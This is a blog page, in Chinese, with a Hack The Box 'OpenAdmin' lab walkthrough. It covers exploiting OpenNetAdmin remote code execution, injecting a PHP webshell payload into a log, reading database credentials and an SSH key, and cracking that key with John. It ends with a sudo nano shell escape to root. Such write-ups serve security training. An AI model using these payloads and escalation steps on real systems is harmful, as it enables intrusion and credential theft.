@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-material.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"evilarsene.icu","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":true,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="OpenAdmin比较简单但典型的机器，可以复习一些常使用的知识">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB:OpenAdmin">
+<meta property="og:url" content="http://evilarsene.icu/2020/10/26/HTB-OpenAdmin/index.html">
+<meta property="og:site_name" content="Love ❤ Hacking">
+<meta property="og:description" content="OpenAdmin比较简单但典型的机器，可以复习一些常使用的知识">
+<meta property="og:locale">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/1.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/2.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/3.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/4.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/5.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/6.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/7.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/8.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/9.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/10.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/11.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/15.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/14.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/16.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/17.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/12.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/21.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/22.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/18.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/19.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/23.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/20.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/24.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/25.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/26.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/27.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/28.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/29.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/30.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/32.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/31.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/33.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/35.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/36.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/37.png">
+<meta property="og:image" content="http://evilarsene.icu/images/OpenAdmin/38.png">
+<meta property="article:published_time" content="2020-10-26T06:12:39.000Z">
+<meta property="article:modified_time" content="2020-10-26T09:26:15.858Z">
+<meta property="article:author" content="EvilArsene">
+<meta property="article:tag" content="Linux靶机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://evilarsene.icu/images/OpenAdmin/1.png">
+
+<link rel="canonical" href="http://evilarsene.icu/2020/10/26/HTB-OpenAdmin/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>HTB:OpenAdmin | Love ❤ Hacking</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+    <a target="_blank" rel="noopener" href="https://github.com/TZESS" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Love ❤ Hacking</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">trickster</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://evilarsene.icu/2020/10/26/HTB-OpenAdmin/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="EvilArsene">
+      <meta itemprop="description" content="人格面具操控者">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Love ❤ Hacking">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HTB:OpenAdmin
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-10-26 14:12:39 / 修改时间：17:26:15" itemprop="dateCreated datePublished" datetime="2020-10-26T14:12:39+08:00">2020-10-26</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HackTheBox/" itemprop="url" rel="index"><span itemprop="name">HackTheBox</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="OpenAdmin"><a href="#OpenAdmin" class="headerlink" title="OpenAdmin"></a>OpenAdmin</h1><p>比较简单但典型的机器，可以复习一些常使用的知识</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/OpenAdmin/1.png" alt="1"></p>
+<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>主页没有发现，进行目录枚举</p>
+<p><img src="/images/OpenAdmin/2.png" alt="2"></p>
+<p>在很多目录下都发现了<code>colorlib</code>，这看起来是一个wordpress的主题，并且没有公开漏洞</p>
+<p><img src="/images/OpenAdmin/3.png" alt="3"></p>
+<p>继续检查，在<code>/ona</code>发现了<code>openetadmin</code>，并且给出具体的版本</p>
+<p><img src="/images/OpenAdmin/4.png" alt="4"></p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>搜索公开漏洞</p>
+<p><img src="/images/OpenAdmin/5.png" alt="5"></p>
+<h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>查看47691.sh</p>
+<p><img src="/images/OpenAdmin/6.png" alt="6"></p>
+<p>应该是只需要一个HTTP请求完成的RCE，修改它，给curl通过代理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -x &#39;http:&#x2F;&#x2F;127.0.0.1:8080&#39;</span><br></pre></td></tr></table></figure>
+
+<p>尝试运行它，会遇到报错</p>
+<p><img src="/images/OpenAdmin/7.png" alt="7"></p>
+<p>又是一个<code>command not found</code>的问题，是linux的换行符<code>\n</code>的问题</p>
+<p><img src="/images/OpenAdmin/8.png" alt="8"></p>
+<p>修复它并执行</p>
+<p><img src="/images/OpenAdmin/9.png" alt="9"></p>
+<p>burp成功抓到了包，可以发送的repeater</p>
+<p><img src="/images/OpenAdmin/10.png" alt="10"></p>
+<p>成功获得RCE，反弹shell到本地，注意URL编码</p>
+<p><img src="/images/OpenAdmin/11.png" alt="11"></p>
+<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>虽然与标注版本不同，但是26682.txt是可以使用的，利用起来稍微麻烦点，阅读理解它比较关键</p>
+<p>首先它提供了一个html页面，来生成攻击参数，它会发送至目标的<code>dcm.php</code>来添加一个模块，而且会将模块的路径参数设置为<code>../../../../../../../../../../../var/log/ona.log</code>，之后去访问<code>dcm.php?module=模块名</code>就能获得RCE，看起来有点像LFI污染日志获得RCE的感觉，不过包含的文件地址是通过添加模块地址时注入的，包含的文件直接就是模块名</p>
+<p>顺着步骤来</p>
+<p>首先获得攻击的payload</p>
+<p><img src="/images/OpenAdmin/15.png" alt="15"></p>
+<p>修改http请求的参数，并修改burp的target地址</p>
+<p><img src="/images/OpenAdmin/14.png" alt="14"></p>
+<p>而且可以发现，添加的模块名，叫做<code>mandat0ry</code>，注入的payload是<code>&lt;?php echo shell_exec($_GET[1]) ?&gt;</code>去访问漏洞页面:<a target="_blank" rel="noopener" href="http://10.10.10.171/ona/dcm.php?module=mandat0ry">http://10.10.10.171/ona/dcm.php?module=mandat0ry</a></p>
+<p><img src="/images/OpenAdmin/16.png" alt="16"></p>
+<p>看起来应该是成功包含了日志，发送RCE命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.171&#x2F;ona&#x2F;dcm.php?module&#x3D;mandat0ry&amp;1&#x3D;id</span><br></pre></td></tr></table></figure>
+
+<p>成功获得RCE</p>
+<p><img src="/images/OpenAdmin/17.png" alt="17"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>发现普通用户</p>
+<p><img src="/images/OpenAdmin/12.png" alt="12"></p>
+<h3 id="jimmy"><a href="#jimmy" class="headerlink" title="jimmy"></a>jimmy</h3><p>常规套路去找ona这个cms的mysql登录凭据，文件比较深，搜索发现比较快:<a target="_blank" rel="noopener" href="https://fossies.org/linux/ona/docs/INSTALL">https://fossies.org/linux/ona/docs/INSTALL</a></p>
+<p><img src="/images/OpenAdmin/21.png" alt="21"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;opt&#x2F;ona&#x2F;www&#x2F;local&#x2F;config&#x2F;database_settings.inc.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/OpenAdmin/22.png" alt="22"></p>
+<p>查招凭据</p>
+<p><img src="/images/OpenAdmin/18.png" alt="18"></p>
+<p>不过破解出的内容不能切换到普通用户</p>
+<p><img src="/images/OpenAdmin/19.png" alt="19"></p>
+<p>但是mysql的连接密码可以切换到jimmy <code>n1nj4W4rri0R!</code></p>
+<p><img src="/images/OpenAdmin/23.png" alt="23"></p>
+<p>虽然知道密码，但是jimmy不在sudo组，有点失望，继续收集信息</p>
+<p>发现了一个特殊的web目录，创建者是jimmy</p>
+<p><img src="/images/OpenAdmin/20.png" alt="20"></p>
+<p>确实是nmap没发现的站点</p>
+<p><img src="/images/OpenAdmin/24.png" alt="24"></p>
+<p>寻找apache的配置文件，希望找到端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf</span><br></pre></td></tr></table></figure>
+
+<p>上面都没发现，在<code>/etc/apache2/sites-enabled</code>目录下发现了端口号</p>
+<p><img src="/images/OpenAdmin/25.png" alt="25"></p>
+<p>远程端口转发，22端口不通，换一个就行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -R 52846:127.0.0.1:6666 jimmy@10.10.10.171 -p 53</span><br></pre></td></tr></table></figure>
+
+<p>得到要给登录页面</p>
+<p><img src="/images/OpenAdmin/26.png" alt="26"></p>
+<p>查看该页面的源代码，需要破解这个sha512的密文</p>
+<p><img src="/images/OpenAdmin/27.png" alt="27"></p>
+<p>破解成功</p>
+<p><img src="/images/OpenAdmin/28.png" alt="28"></p>
+<p>使用<code>jimmy / Revealed</code>登录</p>
+<p>得到密文</p>
+<p><img src="/images/OpenAdmin/29.png" alt="29"></p>
+<p>这里其实不一定要破解这个sha512，查看<code>main.php</code>，可以得到提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php session_start(); if (!isset ($_SESSION[&#39;username&#39;])) &#123; header(&quot;Location: &#x2F;index.php&quot;); &#125;; </span><br><span class="line"># Open Admin Trusted</span><br><span class="line"># OpenAdmin</span><br><span class="line">$output &#x3D; shell_exec(&#39;cat &#x2F;home&#x2F;joanna&#x2F;.ssh&#x2F;id_rsa&#39;);</span><br><span class="line">echo &quot;&lt;pre&gt;$output&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h3&gt;Don&#39;t forget your &quot;ninja&quot; password&lt;&#x2F;h3&gt;</span><br><span class="line">Click here to logout &lt;a href&#x3D;&quot;logout.php&quot; tite &#x3D; &quot;Logout&quot;&gt;Session</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>首先，非常容易发现，它执行了<code>cat /home/joanna/.ssh/id_rsa</code>，可以推测出<code>joanna</code>在这个端口运行了apache服务</p>
+<p>并且当前用户jimmy是<code>/var/www/internal</code>的创建者，拥有W权限，我们可以直接写个webshell到里面</p>
+<p><img src="/images/OpenAdmin/30.png" alt="30"></p>
+<p>这样，这个webshell的权限就会是joanna，成功完成了用户切换，这里可以确实看见joanna运行了apache</p>
+<p><img src="/images/OpenAdmin/32.png" alt="32"></p>
+<p>或者这里的PHP代码出现了问题，完全不需要端口转发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php session_start(); if (!isset ($_SESSION[&#39;username&#39;])) &#123; header(&quot;Location: &#x2F;index.php&quot;); &#125;; </span><br></pre></td></tr></table></figure>
+
+<p>有对session的判断，如果没有登录成功获得session的话，应该会返回<code>index.php</code>，但是由于漏写了die()或exit()退出程序，导致后面代码继续执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php session_start(); if (!isset ($_SESSION[&#39;username&#39;])) &#123; header(&quot;Location: &#x2F;index.php&quot;; die); &#125;;</span><br></pre></td></tr></table></figure>
+
+<p>所以直接curl就行</p>
+<p><img src="/images/OpenAdmin/31.png" alt="31"></p>
+<h3 id="joana"><a href="#joana" class="headerlink" title="joana"></a>joana</h3><p>尝试ssh，发现密钥没加密了</p>
+<p><img src="/images/OpenAdmin/33.png" alt="33"></p>
+<p>破解它</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python &#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py &#x2F;root&#x2F;Desktop&#x2F;id_rsa &gt;hash</span><br><span class="line">john hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>得到<code>bloodninjas</code>，这样就能获取shell了</p>
+<p><img src="/images/OpenAdmin/35.png" alt="35"></p>
+<h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p><img src="/images/OpenAdmin/36.png" alt="36"></p>
+<p>正常来看，应该是允许使用root权限运行nan编辑<code>/opt/priv</code>，有一个使用sudo下nano进行提权</p>
+<p><img src="/images/OpenAdmin/37.png" alt="37"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo &#x2F;bin&#x2F;nano &#x2F;opt&#x2F;priv</span><br><span class="line">ctrl+r</span><br><span class="line">ctrl+x</span><br><span class="line">reset; sh 1&gt;&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure>
+
+<p>获得root</p>
+<p><img src="/images/OpenAdmin/38.png" alt="38"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Linux%E9%9D%B6%E6%9C%BA/" rel="tag"># Linux靶机</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/10/25/HTB-Traceback/" rel="prev" title="HTB:Traceback">
+      <i class="fa fa-chevron-left"></i> HTB:Traceback
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/10/26/HTB-Giddy/" rel="next" title="HTB:Giddy">
+      HTB:Giddy <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#OpenAdmin"><span class="nav-number">1.</span> <span class="nav-text">OpenAdmin</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.1.2.</span> <span class="nav-text">枚举</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">1.2.</span> <span class="nav-text">渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%951"><span class="nav-number">1.2.1.</span> <span class="nav-text">方法1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%952"><span class="nav-number">1.2.2.</span> <span class="nav-text">方法2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">1.3.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#jimmy"><span class="nav-number">1.3.1.</span> <span class="nav-text">jimmy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#joana"><span class="nav-number">1.3.2.</span> <span class="nav-text">joana</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#root"><span class="nav-number">1.3.3.</span> <span class="nav-text">root</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="EvilArsene"
+      src="/images/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">EvilArsene</p>
+  <div class="site-description" itemprop="description">人格面具操控者</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/TZESS" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;TZESS" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/Arsene_IP" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;Arsene_IP" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">EvilArsene</span>
+</div>
+
+<span id="sitetime"></span>
+<script language=javascript>
+	function siteTime(){
+		window.setTimeout("siteTime()", 1000);
+		var seconds = 1000;
+		var minutes = seconds * 60;
+		var hours = minutes * 60;
+		var days = hours * 24;
+		var years = days * 365;
+		var today = new Date();
+		var todayYear = today.getFullYear();
+		var todayMonth = today.getMonth()+1;
+		var todayDate = today.getDate();
+		var todayHour = today.getHours();
+		var todayMinute = today.getMinutes();
+		var todaySecond = today.getSeconds();
+		/* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+		year - 作为date对象的年份，为4位年份值
+		month - 0-11之间的整数，做为date对象的月份
+		day - 1-31之间的整数，做为date对象的天数
+		hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+		minutes - 0-59之间的整数，做为date对象的分钟数
+		seconds - 0-59之间的整数，做为date对象的秒数
+		microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+		var t1 = Date.UTC(2018,02,13,15,00,00); //北京时间2018-2-13 00:00:00
+		var t2 = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);
+		var diff = t2-t1;
+		var diffYears = Math.floor(diff/years);
+		var diffDays = Math.floor((diff/days)-diffYears*365);
+		var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours);
